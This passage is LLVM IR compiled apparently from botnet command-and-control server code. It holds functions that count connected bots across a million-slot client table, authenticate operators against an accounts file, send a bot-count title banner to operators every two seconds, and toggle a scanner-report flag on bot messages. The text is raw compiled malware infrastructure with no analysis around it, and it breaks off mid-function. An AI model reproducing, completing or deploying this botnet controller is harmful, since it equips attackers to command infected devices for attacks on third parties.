  store i64 %192, i64* %16, align 8
  %193 = icmp sgt i64 %192, 0
  br label %194

194:                                              ; preds = %188, %185
  %195 = phi i1 [ false, %185 ], [ %193, %188 ]
  br i1 %195, label %196, label %236

196:                                              ; preds = %194
  %197 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %198 = call i8* @strstr(i8* %197, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0)) #8
  %199 = icmp eq i8* %198, null
  br i1 %199, label %200, label %201

200:                                              ; preds = %196
  store i32 1, i32* %15, align 4
  br label %236

201:                                              ; preds = %196
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %202)
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %204 = call i32 @strcmp(i8* %203, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %205 = icmp eq i32 %204, 0
  br i1 %205, label %206, label %212

206:                                              ; preds = %201
  %207 = load i32, i32* %13, align 4
  %208 = call i64 @send(i32 %207, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i64 5, i32 16384)
  %209 = icmp eq i64 %208, -1
  br i1 %209, label %210, label %211

210:                                              ; preds = %206
  store i32 1, i32* %15, align 4
  br label %236

211:                                              ; preds = %206
  br label %185, !llvm.loop !13

212:                                              ; preds = %201
  %213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %214 = call i8* @strstr(i8* %213, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0)) #8
  %215 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %216 = icmp eq i8* %214, %215
  br i1 %216, label %217, label %220

217:                                              ; preds = %212
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %219 = call i8* @strstr(i8* %218, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0)) #8
  store i8* %219, i8** %18, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %185, !llvm.loop !13

220:                                              ; preds = %212
  %221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %222 = call i8* @strstr(i8* %221, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0)) #8
  %223 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %224 = icmp eq i8* %222, %223
  br i1 %224, label %225, label %228

225:                                              ; preds = %220
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %227 = call i8* @strstr(i8* %226, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0)) #8
  store i8* %227, i8** %19, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %185, !llvm.loop !13

228:                                              ; preds = %220
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0)) #8
  %231 = icmp eq i32 %230, 0
  br i1 %231, label %232, label %233

232:                                              ; preds = %228
  br label %185, !llvm.loop !13

233:                                              ; preds = %228
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %235 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0), i8* %234)
  br label %185, !llvm.loop !13

236:                                              ; preds = %210, %200, %194
  %237 = load i64, i64* %16, align 8
  %238 = icmp eq i64 %237, -1
  br i1 %238, label %239, label %245

239:                                              ; preds = %236
  %240 = call i32* @__errno_location() #10
  %241 = load i32, i32* %240, align 4
  %242 = icmp ne i32 %241, 11
  br i1 %242, label %243, label %244

243:                                              ; preds = %239
  store i32 1, i32* %15, align 4
  br label %244

244:                                              ; preds = %243, %239
  br label %259

245:                                              ; preds = %236
  %246 = load i64, i64* %16, align 8
  %247 = icmp eq i64 %246, 0
  br i1 %247, label %248, label %249

248:                                              ; preds = %245
  store i32 1, i32* %15, align 4
  br label %259

249:                                              ; preds = %245
  br label %250

250:                                              ; preds = %249
  %251 = load i32, i32* %15, align 4
  %252 = icmp ne i32 %251, 0
  br i1 %252, label %253, label %258

253:                                              ; preds = %250
  %254 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %255 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %254, i32 0, i32 1
  store i8 0, i8* %255, align 4
  %256 = load i32, i32* %13, align 4
  %257 = call i32 @close(i32 %256)
  br label %258

258:                                              ; preds = %253, %250
  br label %183

259:                                              ; preds = %248, %244
  br label %260

260:                                              ; preds = %259
  br label %261

261:                                              ; preds = %260
  br label %262

262:                                              ; preds = %261, %169, %57
  %263 = load i32, i32* %7, align 4
  %264 = add nsw i32 %263, 1
  store i32 %264, i32* %7, align 4
  br label %26, !llvm.loop !14

265:                                              ; preds = %26
  br label %22
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Find_Login(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @TitleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %19
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @BotsConnected()
  %11 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0), i32 27, i32 %10, i32 7) #9
  %12 = load i32, i32* %3, align 4
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = call i64 @strlen(i8* %14) #8
  %16 = call i64 @send(i32 %12, i8* %13, i64 %15, i32 16384)
  %17 = icmp eq i64 %16, -1
  br i1 %17, label %18, label %19

18:                                               ; preds = %7
  ret i8* null

19:                                               ; preds = %7
  %20 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [500 x i8], align 16
  %22 = alloca [500 x i8], align 16
  %23 = alloca [500 x i8], align 16
  %24 = alloca [500 x i8], align 16
  %25 = alloca [500 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [5000 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [800 x i8], align 16
  %38 = alloca [800 x i8], align 16
  %39 = alloca [800 x i8], align 16
  %40 = alloca [800 x i8], align 16
  %41 = alloca [800 x i8], align 16
  %42 = alloca [5000 x i8], align 16
  %43 = alloca [2048 x i8], align 16
  %44 = alloca [5000 x i8], align 16
  %45 = alloca [5000 x i8], align 16
  %46 = alloca %struct._IO_FILE*, align 8
  %47 = alloca i64, align 8
  %48 = alloca %struct.tm*, align 8
  %49 = alloca [50 x i8], align 16
  %50 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %51 = load i8*, i8** %3, align 8
  %52 = ptrtoint i8* %51 to i32
  store i32 %52, i32* %4, align 4
  %53 = load volatile i32, i32* @OperatorsConnected, align 4
  %54 = add nsw i32 %53, 1
  store volatile i32 %54, i32* @OperatorsConnected, align 4
  %55 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %55, i8 0, i64 2048, i1 false)
  %56 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %56, i8 0, i64 2048, i1 false)
  %57 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %57, i8 0, i64 2048, i1 false)
  %58 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %58, i8 0, i64 2048, i1 false)
  store i32 0, i32* %14, align 4
  %59 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0))
  store %struct._IO_FILE* %59, %struct._IO_FILE** %13, align 8
  br label %60

60:                                               ; preds = %65, %1
  %61 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %62 = call i32 @feof(%struct._IO_FILE* %61) #9
  %63 = icmp ne i32 %62, 0
  %64 = xor i1 %63, true
  br i1 %64, label %65, label %70

65:                                               ; preds = %60
  %66 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %67 = call i32 @fgetc(%struct._IO_FILE* %66)
  store i32 %67, i32* %15, align 4
  %68 = load i32, i32* %14, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %14, align 4
  br label %60, !llvm.loop !17

70:                                               ; preds = %60
  store i32 0, i32* %16, align 4
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %71)
  br label %72

72:                                               ; preds = %77, %70
  %73 = load i32, i32* %16, align 4
  %74 = load i32, i32* %14, align 4
  %75 = sub nsw i32 %74, 1
  %76 = icmp ne i32 %73, %75
  br i1 %76, label %77, label %92

77:                                               ; preds = %72
  %78 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %79 = load i32, i32* %16, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %80
  %82 = getelementptr inbounds %struct.login_info, %struct.login_info* %81, i32 0, i32 0
  %83 = getelementptr inbounds [100 x i8], [100 x i8]* %82, i64 0, i64 0
  %84 = load i32, i32* %16, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %85
  %87 = getelementptr inbounds %struct.login_info, %struct.login_info* %86, i32 0, i32 1
  %88 = getelementptr inbounds [100 x i8], [100 x i8]* %87, i64 0, i64 0
  %89 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %78, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i64 0, i64 0), i8* %83, i8* %88)
  %90 = load i32, i32* %16, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %16, align 4
  br label %72, !llvm.loop !18

92:                                               ; preds = %72
  %93 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %93, i8 0, i64 2048, i1 false)
  %94 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %95 = call i32 (i8*, i8*, ...) @sprintf(i8* %94, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0)) #9
  %96 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %97 = call i32 (i8*, i8*, ...) @sprintf(i8* %96, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.16, i64 0, i64 0)) #9
  %98 = load i32, i32* %4, align 4
  %99 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %100 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %101 = call i64 @strlen(i8* %100) #8
  %102 = call i64 @send(i32 %98, i8* %99, i64 %101, i32 16384)
  %103 = icmp eq i64 %102, -1
  br i1 %103, label %104, label %105

104:                                              ; preds = %92
  br label %701

105:                                              ; preds = %92
  %106 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %107 = load i32, i32* %4, align 4
  %108 = call i32 @fdgets(i8* %106, i32 2048, i32 %107)
  %109 = icmp slt i32 %108, 1
  br i1 %109, label %110, label %111

110:                                              ; preds = %105
  br label %701

111:                                              ; preds = %105
  %112 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %112)
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %114
  %116 = getelementptr inbounds %struct.login_info, %struct.login_info* %115, i32 0, i32 0
  %117 = getelementptr inbounds [100 x i8], [100 x i8]* %116, i64 0, i64 0
  %118 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %119 = call i32 (i8*, i8*, ...) @sprintf(i8* %117, i8* %118) #9
  %120 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %120, i8** %19, align 8
  %121 = load i8*, i8** %19, align 8
  %122 = call i32 @Find_Login(i8* %121)
  store i32 %122, i32* %5, align 4
  %123 = load i8*, i8** %19, align 8
  %124 = load i32, i32* %5, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %125
  %127 = getelementptr inbounds %struct.login_info, %struct.login_info* %126, i32 0, i32 0
  %128 = getelementptr inbounds [100 x i8], [100 x i8]* %127, i64 0, i64 0
  %129 = call i32 @strcmp(i8* %123, i8* %128) #8
  %130 = icmp eq i32 %129, 0
  br i1 %130, label %131, label %301

131:                                              ; preds = %111
  %132 = load i32, i32* %4, align 4
  %133 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %134 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %135 = call i64 @strlen(i8* %134) #8
  %136 = call i64 @send(i32 %132, i8* %133, i64 %135, i32 16384)
  %137 = icmp eq i64 %136, -1
  br i1 %137, label %138, label %139

138:                                              ; preds = %131
  br label %701

139:                                              ; preds = %131
  %140 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %141 = load i32, i32* %5, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %142
  %144 = getelementptr inbounds %struct.login_info, %struct.login_info* %143, i32 0, i32 0
  %145 = getelementptr inbounds [100 x i8], [100 x i8]* %144, i64 0, i64 0
  %146 = call i32 (i8*, i8*, ...) @sprintf(i8* %140, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.18, i64 0, i64 0), i8* %145) #9
  %147 = load i32, i32* %4, align 4
  %148 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %149 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %150 = call i64 @strlen(i8* %149) #8
  %151 = call i64 @send(i32 %147, i8* %148, i64 %150, i32 16384)
  %152 = icmp eq i64 %151, -1
  br i1 %152, label %153, label %154

153:                                              ; preds = %139
  br label %701

154:                                              ; preds = %139
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %156 = load i32, i32* %4, align 4
  %157 = call i32 @fdgets(i8* %155, i32 2048, i32 %156)
  %158 = icmp slt i32 %157, 1
  br i1 %158, label %159, label %160

159:                                              ; preds = %154
  br label %701

160:                                              ; preds = %154
  %161 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %161)
  %162 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %164
  %166 = getelementptr inbounds %struct.login_info, %struct.login_info* %165, i32 0, i32 1
  %167 = getelementptr inbounds [100 x i8], [100 x i8]* %166, i64 0, i64 0
  %168 = call i32 @strcmp(i8* %162, i8* %167) #8
  %169 = icmp ne i32 %168, 0
  br i1 %169, label %170, label %171

170:                                              ; preds = %160
  br label %302

171:                                              ; preds = %160
  %172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %172, i8 0, i64 2048, i1 false)
  %173 = getelementptr inbounds [500 x i8], [500 x i8]* %21, i64 0, i64 0
  %174 = load i32, i32* %5, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %175
  %177 = getelementptr inbounds %struct.login_info, %struct.login_info* %176, i32 0, i32 0
  %178 = getelementptr inbounds [100 x i8], [100 x i8]* %177, i64 0, i64 0
  %179 = call i32 (i8*, i8*, ...) @sprintf(i8* %173, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.19, i64 0, i64 0), i8* %178) #9
  %180 = getelementptr inbounds [500 x i8], [500 x i8]* %22, i64 0, i64 0
  %181 = load i32, i32* %5, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %182
  %184 = getelementptr inbounds %struct.login_info, %struct.login_info* %183, i32 0, i32 0
  %185 = getelementptr inbounds [100 x i8], [100 x i8]* %184, i64 0, i64 0
  %186 = call i32 (i8*, i8*, ...) @sprintf(i8* %180, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.19, i64 0, i64 0), i8* %185) #9
  %187 = getelementptr inbounds [500 x i8], [500 x i8]* %23, i64 0, i64 0
  %188 = load i32, i32* %5, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %189
  %191 = getelementptr inbounds %struct.login_info, %struct.login_info* %190, i32 0, i32 0
  %192 = getelementptr inbounds [100 x i8], [100 x i8]* %191, i64 0, i64 0
  %193 = call i32 (i8*, i8*, ...) @sprintf(i8* %187, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.19, i64 0, i64 0), i8* %192) #9
  %194 = getelementptr inbounds [500 x i8], [500 x i8]* %24, i64 0, i64 0
  %195 = load i32, i32* %5, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %196
  %198 = getelementptr inbounds %struct.login_info, %struct.login_info* %197, i32 0, i32 0
  %199 = getelementptr inbounds [100 x i8], [100 x i8]* %198, i64 0, i64 0
  %200 = call i32 (i8*, i8*, ...) @sprintf(i8* %194, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.19, i64 0, i64 0), i8* %199) #9
  %201 = getelementptr inbounds [500 x i8], [500 x i8]* %25, i64 0, i64 0
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %203
  %205 = getelementptr inbounds %struct.login_info, %struct.login_info* %204, i32 0, i32 0
  %206 = getelementptr inbounds [100 x i8], [100 x i8]* %205, i64 0, i64 0
  %207 = call i32 (i8*, i8*, ...) @sprintf(i8* %201, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.19, i64 0, i64 0), i8* %206) #9
  %208 = load i32, i32* %4, align 4
  %209 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %210 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %211 = call i64 @strlen(i8* %210) #8
  %212 = call i64 @send(i32 %208, i8* %209, i64 %211, i32 16384)
  %213 = icmp eq i64 %212, -1
  br i1 %213, label %214, label %215

214:                                              ; preds = %171
  br label %701

215:                                              ; preds = %171
  %216 = load i32, i32* %4, align 4
  %217 = getelementptr inbounds [500 x i8], [500 x i8]* %21, i64 0, i64 0
  %218 = getelementptr inbounds [500 x i8], [500 x i8]* %21, i64 0, i64 0
  %219 = call i64 @strlen(i8* %218) #8
  %220 = call i64 @send(i32 %216, i8* %217, i64 %219, i32 16384)
  %221 = icmp eq i64 %220, -1
  br i1 %221, label %222, label %223

222:                                              ; preds = %215
  br label %701

223:                                              ; preds = %215
  %224 = call i32 @sleep(i32 1)
  %225 = load i32, i32* %4, align 4
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %227 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %228 = call i64 @strlen(i8* %227) #8
  %229 = call i64 @send(i32 %225, i8* %226, i64 %228, i32 16384)
  %230 = icmp eq i64 %229, -1
  br i1 %230, label %231, label %232

231:                                              ; preds = %223
  br label %701

232:                                              ; preds = %223
  %233 = load i32, i32* %4, align 4
  %234 = getelementptr inbounds [500 x i8], [500 x i8]* %22, i64 0, i64 0
  %235 = getelementptr inbounds [500 x i8], [500 x i8]* %22, i64 0, i64 0
  %236 = call i64 @strlen(i8* %235) #8
  %237 = call i64 @send(i32 %233, i8* %234, i64 %236, i32 16384)
  %238 = icmp eq i64 %237, -1
  br i1 %238, label %239, label %240

239:                                              ; preds = %232
  br label %701

240:                                              ; preds = %232
  %241 = call i32 @sleep(i32 1)
  %242 = load i32, i32* %4, align 4
  %243 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %244 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %245 = call i64 @strlen(i8* %244) #8
  %246 = call i64 @send(i32 %242, i8* %243, i64 %245, i32 16384)
  %247 = icmp eq i64 %246, -1
  br i1 %247, label %248, label %249

248:                                              ; preds = %240
  br label %701

249:                                              ; preds = %240
  %250 = load i32, i32* %4, align 4
  %251 = getelementptr inbounds [500 x i8], [500 x i8]* %23, i64 0, i64 0
  %252 = getelementptr inbounds [500 x i8], [500 x i8]* %23, i64 0, i64 0
  %253 = call i64 @strlen(i8* %252) #8
